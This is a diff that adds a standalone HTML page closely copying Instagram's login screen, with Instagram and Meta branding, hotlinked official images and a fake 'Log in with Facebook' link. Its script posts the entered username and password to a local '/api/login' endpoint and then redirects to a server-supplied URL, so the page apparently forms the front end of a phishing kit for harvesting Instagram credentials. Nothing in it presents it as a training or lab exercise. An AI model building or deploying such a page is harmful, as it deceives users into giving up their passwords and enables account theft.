@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .login-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+
+        .phone-preview {
+            display: none;
+        }
+
+        .login-box {
+            width: 350px;
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            text-align: center;
+            border-radius: 1px;
+        }
+
+        .login-box img {
+            width: 175px;
+            margin: 20px auto;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .login-box input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            border: none;
+            color: white;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-size: 14px;
+            transition: background 0.2s;
+        }
+
+        .login-box button:hover {
+            background: #0086e0;
+        }
+
+        .login-box button:disabled {
+            background: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+            margin: 0 18px;
+        }
+
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+
+        .forgot {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            margin-top: 15px;
+            display: inline-block;
+        }
+
+        .signup-box {
+            width: 350px;
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .error-message {
+            color: #ed4956;
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .app-download {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .app-download p {
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .app-download img {
+            height: 40px;
+            margin: 0 5px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .footer a {
+            text-decoration: none;
+            color: #8e8e8e;
+            margin: 0 8px;
+        }
+
+        .footer .links {
+            margin-bottom: 20px;
+        }
+
+        @media screen and (min-width: 768px) {
+            .login-section {
+                flex-direction: row;
+                justify-content: center;
+            }
+
+            .phone-preview {
+                display: block;
+                margin-right: 30px;
+            }
+
+            .phone-preview img {
+                width: 380px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-section">
+            <div class="phone-preview">
+                <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png" alt="Instagram Mobile Preview">
+            </div>
+
+            <div>
+                <div class="login-box">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+                    
+                    <form id="loginForm">
+                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+                        <input type="password" id="password" name="password" placeholder="Password" required>
+                        <p class="error-message" id="errorMessage"></p>
+                        <button type="submit" id="loginBtn">Log In</button>
+                    </form>
+
+                    <div class="divider">OR</div>
+
+                    <a href="#" class="fb-login">
+                        <svg width="16" height="16" fill="#385185" viewBox="0 0 24 24">
+                            <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/>
+                        </svg>
+                        Log in with Facebook
+                    </a>
+
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+
+                <div class="signup-box">
+                    Don't have an account? <a href="/signup">Sign up</a>
+                </div>
+
+                <div class="app-download">
+                    <p>Get the app.</p>
+                    <a href="#">
+                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
+                    </a>
+                    <a href="#">
+                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="links">
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Locations</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+            </div>
+            <p>© 2024 Instagram from Meta</p>
+        </div>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
+        const loginBtn = document.getElementById('loginBtn');
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logging in...';
+            errorMessage.style.display = 'none';
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    window.location.href = data.redirect;
+                } else {
+                    errorMessage.textContent = data.error;
+                    errorMessage.style.display = 'block';
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = 'Log In';
+                }
+            } catch (error) {
+                errorMessage.textContent = 'Something went wrong. Please try again.';
+                errorMessage.style.display = 'block';
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Log In';
+            }
+        });
+    </script>
+</body>
+</html>
